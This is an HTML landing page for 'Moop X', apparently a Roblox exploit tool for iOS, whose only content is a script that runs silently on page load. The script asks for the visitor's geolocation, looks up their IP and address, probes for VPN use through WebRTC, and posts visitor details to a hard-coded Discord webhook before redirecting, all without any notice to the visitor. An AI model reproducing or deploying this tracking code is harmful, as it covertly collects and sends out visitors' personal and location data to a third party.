<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moop X</title>
    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Moop X">
    <meta property="og:description" content="Redefining Roblox on iOS with state-of-the-art features and seamless execution. Elevate your gaming experience to unprecedented levels. Download now for a new standard of excellence in mobile gameplay.">
    <meta property="og:url" content="https://moopx.pro/home">
</head>
<body>
    <script>
        // Function to send user and device information to Discord
        const sendInfoToDiscord = (ip, address, userAgent, isVPN, coordinates) => {
            const webhookUrl = 'https://discord.com/api/webhooks/1181948401353502751/dv7MXBVzmttSIHREI2lZ67U2sb5CvroDpv62nsGAH1yDBihziRNfX3vtYJY304G14BF4'; // Replace with your Discord webhook URL

            return fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: 'Visitor Info Bot',
                    content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
                }),
            });
        };

        // Function to check if the user is using a VPN
        const checkVPN = () => {
            const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

            if (RTCPeerConnection) {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');

                rtc.createOffer().then(
                    rtc.createAnswer.bind(rtc),
                    () => {
                        // The user is likely using a VPN
                        sendInfoToDiscord('N/A', 'N/A', navigator.userAgent, true, 'N/A').then(() => {
                            redirectToWebsite();
                        });
                    }
                ).catch(() => {
                    // The user is not using a VPN
                    sendInfoToDiscord('N/A', 'N/A', navigator.userAgent, false, 'N/A').then(() => {
                        redirectToWebsite();
                    });
                });
            } else {
                // Unable to determine VPN status
                sendInfoToDiscord('N/A', 'N/A', navigator.userAgent, 'Unknown', 'N/A').then(() => {
                    redirectToWebsite();
                });
            }
        };

        // Function to get visitor's information including coordinates
        const getVisitorInfo = async () => {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });

                const coordinates = `${position.coords.latitude},${position.coords.longitude}`;

                // Requesting IP and address from a third-party service (replace with your preferred service)
                const infoResponse = await fetch('https://ipinfo.io/json');
                const infoData = await infoResponse.json();

                const ip = infoData.ip || 'N/A';
                const address = `${infoData.city || 'N/A'}, ${infoData.region || 'N/A'}, ${infoData.country || 'N/A'}`;
                const userAgent = navigator.userAgent;

                // Check if the user is using a VPN and redirect after Discord webhook response
                checkVPN();
            } catch (error) {
                console.error('Error fetching location or address:', error);
            }
        };

        // Function to redirect to "https://moopx.pro"
        const redirectToWebsite = () => {
            window.location.href = "https://moopx.pro";
        };

        // Call the function when the page loads
        document.addEventListener('DOMContentLoaded', getVisitorInfo);
    </script>
</body>
</html>
